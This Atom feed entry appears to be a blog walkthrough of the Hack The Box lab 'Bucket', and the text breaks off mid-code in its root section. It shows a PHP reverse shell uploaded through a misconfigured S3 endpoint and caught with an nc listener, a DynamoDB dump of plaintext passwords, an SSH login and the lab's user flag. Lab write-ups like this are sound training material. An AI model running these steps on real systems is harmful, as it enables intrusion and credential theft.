<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Random stuff</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2021-06-27T20:00:00+02:00</updated><entry><title>HTB: Bucket</title><link href="/htb-bucket.html" rel="alternate"></link><published>2021-06-27T20:00:00+02:00</published><updated>2021-06-27T20:00:00+02:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2021-06-27:/htb-bucket.html</id><summary type="html">&lt;p&gt;Solution to the &lt;em&gt;Bucket&lt;/em&gt; VM&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Foothold&lt;/h1&gt;
&lt;p&gt;First, as always we scan ports with &lt;em&gt;nmap&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nmap -sS -sV  &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212  
Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.91 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2021&lt;/span&gt;-05-16 &lt;span class="m"&gt;23&lt;/span&gt;:27 CEST
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212
Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.038s latency&lt;span class="o"&gt;)&lt;/span&gt;.
Not shown: &lt;span class="m"&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
&lt;span class="m"&gt;22&lt;/span&gt;/tcp open  ssh     OpenSSH &lt;span class="m"&gt;8&lt;/span&gt;.2p1 Ubuntu &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class="p"&gt;;&lt;/span&gt; protocol &lt;span class="m"&gt;2&lt;/span&gt;.0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;80&lt;/span&gt;/tcp open  http    Apache httpd &lt;span class="m"&gt;2&lt;/span&gt;.4.41
Service Info: Host: &lt;span class="m"&gt;127&lt;/span&gt;.0.1.1&lt;span class="p"&gt;;&lt;/span&gt; OS: Linux&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;8&lt;/span&gt;.03 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There is something on port 80, so lets check:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;302 Found&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Found&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;The document has moved &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://bucket.htb/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;here&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;.&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;hr&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;address&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;address&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we have to map this host name with the ip address:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10.10.10.212 bucket.htb&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/hosts
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now it start to work, but while looking through source code of recived page, we can see images urls, that are not opened correcly, like: http://s3.bucket.htb/adserver/images/bug.jpg&lt;/p&gt;
&lt;p&gt;So we can add another line to our &lt;strong&gt;hosts&lt;/strong&gt; file&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10.10.10.212 s3.bucket.htb&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/hosts
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Great, the page is looking good right now. But the interesting part is the &lt;strong&gt;s3&lt;/strong&gt; suffix, as it sounds like a local instance of the famous Amazon Simple Storage Service. And the title of this machine confirms out assumption! So... let's have some fun with it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/adserver/images/&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;Error&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;Code&amp;gt;&lt;/span&gt;NoSuchKey&lt;span class="nt"&gt;&amp;lt;/Code&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;Message&amp;gt;&lt;/span&gt;The specified key does not exist.&lt;span class="nt"&gt;&amp;lt;/Message&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;RequestID&amp;gt;&lt;/span&gt;7a62c49f-347e-4fc4-9331-6e8eEXAMPLE&lt;span class="nt"&gt;&amp;lt;/RequestID&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/Error&amp;gt;&lt;/span&gt;┌─[pawel@parrot]─[~]
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/adserver/&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/&amp;quot;&lt;/span&gt;
&lt;span class="sb"&gt;```&lt;/span&gt;json
&lt;span class="sb"&gt;```&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see different responses, so it looks promissing!&lt;/p&gt;
&lt;p&gt;As it look like a s3 instance, we can try to use it like it, either by working with pure requests:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -X PUT http://s3.bucket.htb/adserver/ -T reverse-shell.php
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That looks like a pure luck, but it is really working... But we can try something more. Why not use some FUZZ?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc &lt;span class="m"&gt;404&lt;/span&gt; http://s3.bucket.htb/FUZZ/foo/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And hey, what we have here!?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================


000001688:   500        0 L      13 W       158 Ch      &amp;quot;shell&amp;quot;                                                                                   
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="39fbf0566c187f6e594f2c457cc0a0c9.png" src="../_resources/e578d9f200b54f42b2bd40f213fb932b.png"&gt;&lt;/p&gt;
&lt;p&gt;We are definitly going somewhere. For now just note that discovery.&lt;/p&gt;
&lt;p&gt;For now we can try last, but most important thing: use the &lt;strong&gt;aws&lt;/strong&gt; cli. It is already on your system or just install it from system repo.&lt;/p&gt;
&lt;p&gt;Now the param &lt;strong&gt;--endpoint-url&lt;/strong&gt; will be crucial. Lets try:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url=http://s3.bucket.htb s3 ls adserver/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nope, one more step is missing:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws configure
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But we don't have any legit credentials. What can we do? Oh, well, just type anything in there. Any random stuff. And it works, jeeez!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 ls adserver/
                           PRE images/
&lt;span class="m"&gt;2021&lt;/span&gt;-06-26 &lt;span class="m"&gt;23&lt;/span&gt;:58:04       &lt;span class="m"&gt;5344&lt;/span&gt; index.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So prepare your pretty php reverse shell and copy it on the server, hoping it will work.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we can try to execute it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nc -lvnp &lt;span class="m"&gt;4321&lt;/span&gt; &lt;span class="c1"&gt;# in one term&lt;/span&gt;
&lt;span class="c1"&gt;# next that below in another:&lt;/span&gt;
curl http://bucket.htb/php-reverse-shell.php
&lt;span class="c1"&gt;# BOOM, we got the foothold&lt;/span&gt;
listening on &lt;span class="o"&gt;[&lt;/span&gt;any&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;4321&lt;/span&gt; ...
connect to &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.14.11&lt;span class="o"&gt;]&lt;/span&gt; from &lt;span class="o"&gt;(&lt;/span&gt;UNKNOWN&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.212&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;54924&lt;/span&gt;
Linux bucket &lt;span class="m"&gt;5&lt;/span&gt;.4.0-48-generic &lt;span class="c1"&gt;#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 &lt;span class="m"&gt;22&lt;/span&gt;:03:15 up  &lt;span class="m"&gt;3&lt;/span&gt;:08,  &lt;span class="m"&gt;1&lt;/span&gt; user,  load average: &lt;span class="m"&gt;0&lt;/span&gt;.01, &lt;span class="m"&gt;0&lt;/span&gt;.20, &lt;span class="m"&gt;0&lt;/span&gt;.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
roy      pts/1    &lt;span class="m"&gt;10&lt;/span&gt;.10.14.11      &lt;span class="m"&gt;18&lt;/span&gt;:59   &lt;span class="m"&gt;56&lt;/span&gt;.00s  &lt;span class="m"&gt;0&lt;/span&gt;.44s  &lt;span class="m"&gt;0&lt;/span&gt;.44s -bash
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt;
/bin/sh: &lt;span class="m"&gt;0&lt;/span&gt;: can&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t access tty&lt;span class="p"&gt;;&lt;/span&gt; job control turned off
$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We are inside!&lt;/p&gt;
&lt;h1&gt;User&lt;/h1&gt;
&lt;p&gt;Escalating privileges in this case is quite simple, but we have to combine something new to find, with some foothold info. And with some luck, if it was a real life scenario.&lt;/p&gt;
&lt;p&gt;Of course it is recomended to start some enumaration scripts in this moment. Like &lt;em&gt;LinEnum&lt;/em&gt; or &lt;em&gt;linpeas&lt;/em&gt; and I encourage you to do it. But lets jump straight to the solution.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /home
$ ls
roy
$ &lt;span class="nb"&gt;cd&lt;/span&gt; roy
$ ls
project
user.txt
$ cat user.txt
cat: user.txt: Permission denied
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That give us at least the user name: &lt;em&gt;roy&lt;/em&gt;. Great, but what about the password. Lets step back, to the foothold. We know about the dynamodb service, and we probably have access to id. Why not try to dive in it?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb list-tables
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;TableNames&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;users&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb scan --table-name users
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;Items&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Management@#1@#&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;},&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Mgmt&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Welcome123!&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;},&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Cloudadm&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;n2vM-&amp;lt;_K_Q:.Aa2&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;},&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Sysadm&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;Count&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;ScannedCount&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;ConsumedCapacity&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We have found three passwords to try. And guess what: we can use the third one to log in through &lt;em&gt;ssh&lt;/em&gt; to &lt;em&gt;roy's&lt;/em&gt; account!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh roy@10.10.10.212
Welcome to Ubuntu &lt;span class="m"&gt;20&lt;/span&gt;.04 LTS &lt;span class="o"&gt;(&lt;/span&gt;GNU/Linux &lt;span class="m"&gt;5&lt;/span&gt;.4.0-48-generic x86_64&lt;span class="o"&gt;)&lt;/span&gt;

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun &lt;span class="m"&gt;27&lt;/span&gt; Jun &lt;span class="m"&gt;2021&lt;/span&gt; &lt;span class="m"&gt;09&lt;/span&gt;:44:22 AM UTC

  System load:                      &lt;span class="m"&gt;0&lt;/span&gt;.0
  Usage of /:                       &lt;span class="m"&gt;33&lt;/span&gt;.8% of &lt;span class="m"&gt;17&lt;/span&gt;.59GB
  Memory usage:                     &lt;span class="m"&gt;22&lt;/span&gt;%
  Swap usage:                       &lt;span class="m"&gt;0&lt;/span&gt;%
  Processes:                        &lt;span class="m"&gt;239&lt;/span&gt;
  Users logged in:                  &lt;span class="m"&gt;0&lt;/span&gt;
  IPv4 address &lt;span class="k"&gt;for&lt;/span&gt; br-bee97070fb20: &lt;span class="m"&gt;172&lt;/span&gt;.18.0.1
  IPv4 address &lt;span class="k"&gt;for&lt;/span&gt; docker0:         &lt;span class="m"&gt;172&lt;/span&gt;.17.0.1
  IPv4 address &lt;span class="k"&gt;for&lt;/span&gt; ens160:          &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212
  IPv6 address &lt;span class="k"&gt;for&lt;/span&gt; ens160:          dead:beef::250:56ff:feb9:c8be


&lt;span class="m"&gt;229&lt;/span&gt; updates can be installed immediately.
&lt;span class="m"&gt;103&lt;/span&gt; of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check &lt;span class="k"&gt;for&lt;/span&gt; new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jun &lt;span class="m"&gt;26&lt;/span&gt; &lt;span class="m"&gt;18&lt;/span&gt;:59:31 &lt;span class="m"&gt;2021&lt;/span&gt; from &lt;span class="m"&gt;10&lt;/span&gt;.10.14.11
roy@bucket:~$ ls
project  user.txt
roy@bucket:~$ cat user.txt 
1845bbd4c30469474a3f5d2be1a32922
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As we have the user flag, lets jump into the final part.&lt;/p&gt;
&lt;h1&gt;Root&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;roy@bucket:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; /var/www/
roy@bucket:/var/www$ ls -l
total &lt;span class="m"&gt;8&lt;/span&gt;
drwxr-x---+ &lt;span class="m"&gt;4&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; Feb &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:29 bucket-app
drwxr-xr-x  &lt;span class="m"&gt;2&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; Jun &lt;span class="m"&gt;27&lt;/span&gt; &lt;span class="m"&gt;09&lt;/span&gt;:46 html
roy@bucket:/var/www$ &lt;span class="nb"&gt;cd&lt;/span&gt; bucket-app/
roy@bucket:/var/www/bucket-app$ ls
composer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor
roy@bucket:/var/www/bucket-app$ head -n &lt;span class="m"&gt;30&lt;/span&gt; index.php 
&amp;lt;?php
require &lt;span class="s1"&gt;&amp;#39;vendor/autoload.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
use Aws&lt;span class="se"&gt;\D&lt;/span&gt;ynamoDb&lt;span class="se"&gt;\D&lt;/span&gt;ynamoDbClient&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;REQUEST_METHOD&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]===&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;action&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]===&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;get_alerts&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
                date_default_timezone_set&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;America/New_York&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="nv"&gt;$client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; new DynamoDbClient&lt;span class="o"&gt;([&lt;/span&gt;
                        &lt;span class="s1"&gt;&amp;#39;profile&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt;,
                        &lt;span class="s1"&gt;&amp;#39;region&amp;#39;&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s1"&gt;&amp;#39;us-east-1&amp;#39;&lt;/span&gt;,
                        &lt;span class="s1"&gt;&amp;#39;version&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s1"&gt;&amp;#39;latest&amp;#39;&lt;/span&gt;,
                        &lt;span class="s1"&gt;&amp;#39;endpoint&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s1"&gt;&amp;#39;http://localhost:4566&amp;#39;&lt;/span&gt;
                &lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

                &lt;span class="nv"&gt;$iterator&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$client&lt;/span&gt;-&amp;gt;getIterator&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Scan&amp;#39;&lt;/span&gt;, array&lt;span class="o"&gt;(&lt;/span&gt;
                        &lt;span class="s1"&gt;&amp;#39;TableName&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s1"&gt;&amp;#39;alerts&amp;#39;&lt;/span&gt;,
